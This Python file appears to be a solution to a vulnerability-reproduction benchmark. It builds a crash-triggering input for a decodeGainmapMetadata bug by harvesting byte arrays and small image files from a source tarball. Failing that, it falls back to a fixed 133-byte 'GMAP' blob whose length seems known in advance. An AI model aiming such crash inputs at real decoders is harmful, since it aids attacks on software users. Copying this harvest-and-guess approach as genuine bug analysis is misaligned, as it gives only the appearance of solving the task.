import os
import tarfile
import tempfile
import re
from typing import Optional, List, Tuple


def _safe_extract(tar: tarfile.TarFile, path: str) -> None:
    path = os.path.abspath(path)
    for member in tar.getmembers():
        member_path = os.path.abspath(os.path.join(path, member.name))
        if not member_path.startswith(path + os.sep) and member_path != path:
            continue
        try:
            tar.extract(member, path)
        except Exception:
            continue


def _parse_c_int_literal(token: str) -> Optional[int]:
    token = token.strip()
    if not token:
        return None

    # Strip trailing comments if any (defensive)
    if '//' in token:
        token = token.split('//', 1)[0].strip()
    # Remove possible suffixes like U, UL, L, LL, etc.
    token = re.sub(r'[uUlL]+$', '', token)

    # Character literal: 'a', '\n', '\x41'
    if len(token) >= 2 and token[0] == "'" and token[-1] == "'":
        inner = token[1:-1]
        if not inner:
            return None
        if inner.startswith('\\'):
            # Escaped
            if len(inner) == 2:
                esc = inner[1]
                mapping = {
                    'n': ord('\n'),
                    'r': ord('\r'),
                    't': ord('\t'),
                    '0': 0,
                    '\\': ord('\\'),
                    "'": ord("'"),
                    '"': ord('"'),
                }
                return mapping.get(esc, None)
            if inner.startswith('\\x'):
                try:
                    return int(inner[2:], 16) & 0xFF
                except ValueError:
                    return None
        # Simple char
        return ord(inner[0]) & 0xFF

    # Hex literal
    if token.lower().startswith('0x'):
        try:
            return int(token, 16) & 0xFF
        except ValueError:
            return None

    # Decimal or octal (we'll just treat as decimal)
    if re.fullmatch(r'[+-]?\d+', token):
        try:
            return int(token, 10) & 0xFF
        except ValueError:
            return None

    return None


def _extract_c_arrays_with_bytes(content: str) -> List[Tuple[str, bytes]]:
    arrays: List[Tuple[str, bytes]] = []
    # Remove multi-line comments to avoid confusion
    content_wo_comments = re.sub(r'/\*.*?\*/', '', content, flags=re.DOTALL)

    pattern = re.compile(
        r'(?:static\s+)?'
        r'(?:const\s+)?'
        r'(?:unsigned\s+|signed\s+)?'
        r'(?:char|uint8_t|int8_t)\s+'
        r'(?P<name>\w+)\s*'
        r'(?:\[\s*\])?\s*=\s*'
        r'\{(?P<body>.*?)\}\s*;',
        re.DOTALL,
    )

    for m in pattern.finditer(content_wo_comments):
        name = m.group('name')
        body = m.group('body')
        # Split on commas
        tokens = [t.strip() for t in body.replace('\n', ' ').split(',')]
        data: List[int] = []
        for tok in tokens:
            if not tok:
                continue
            val = _parse_c_int_literal(tok)
            if val is None:
                # If we encounter something we can't parse, skip this token
                continue
            data.append(val)
        if data:
            arrays.append((name, bytes(data)))
    return arrays


def _find_poc_via_c_arrays(root: str) -> Optional[bytes]:
    best_candidate: Optional[bytes] = None
    best_score: Optional[Tuple[int, int]] = None  # (distance_from_133, length)

    for dirpath, _, filenames in os.walk(root):
        for filename in filenames:
            if not filename.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh')):
                continue
            path = os.path.join(dirpath, filename)
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            except Exception:
                continue

            if 'decodeGainmapMetadata' not in content:
                continue

            arrays = _extract_c_arrays_with_bytes(content)
            if not arrays:
                continue

            # Find calls to decodeGainmapMetadata
            call_pattern = re.compile(
                r'decodeGainmapMetadata\s*\((?P<args>[^;]*?)\);',
                re.DOTALL,
            )
            calls = list(call_pattern.finditer(content))
            if not calls:
                continue

            for name, data in arrays:
                used = False
                for call in calls:
                    args = call.group('args')
                    if name in args:
                        used = True
                        break
                if not used:
                    continue

                # Candidate array used in a call to decodeGainmapMetadata
                dist = abs(len(data) - 133)
                score = (dist, len(data))
                if best_score is None or score < best_score:
                    best_score = score
                    best_candidate = data

    return best_candidate


def _find_poc_via_binary_files(root: str) -> Optional[bytes]:
    candidates: List[bytes] = []

    for dirpath, _, filenames in os.walk(root):
        for filename in filenames:
            lower = filename.lower()
            if ("gain" not in lower and "hdr" not in lower and "gm" not in lower):
                continue
            if not lower.endswith((
                '.bin', '.dat', '.icc', '.icm', '.jpg', '.jpeg',
                '.heic', '.avif', '.webp', '.jxl', '.png'
            )):
                continue
            path = os.path.join(dirpath, filename)
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if size <= 0 or size > 4096:
                continue
            try:
                with open(path, 'rb') as f:
                    data = f.read()
            except Exception:
                continue
            if not data:
                continue
            candidates.append(data)

    if not candidates:
        return None

    # Prefer candidate whose length is closest to 133
    def score_fn(b: bytes) -> Tuple[int, int]:
        return (abs(len(b) - 133), len(b))

    return min(candidates, key=score_fn)


def _generic_poc() -> bytes:
    magic = b'GMAP'
    meta_len = (0).to_bytes(4, 'little')
    total_len = 133
    if len(magic) + len(meta_len) >= total_len:
        return (magic + meta_len)[:total_len]
    padding_len = total_len - len(magic) + -len(meta_len)
    padding = b'\xff' * padding_len
    data = magic + meta_len + padding
    return data[:total_len]


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            if src_path and os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                tmpdir = tempfile.mkdtemp(prefix="src_")
                try:
                    with tarfile.open(src_path, 'r:*') as tar:
                        _safe_extract(tar, tmpdir)

                    poc = _find_poc_via_c_arrays(tmpdir)
                    if poc:
                        return poc

                    poc = _find_poc_via_binary_files(tmpdir)
                    if poc:
                        return poc
                except Exception:
                    pass
        except Exception:
            pass

        return _generic_poc()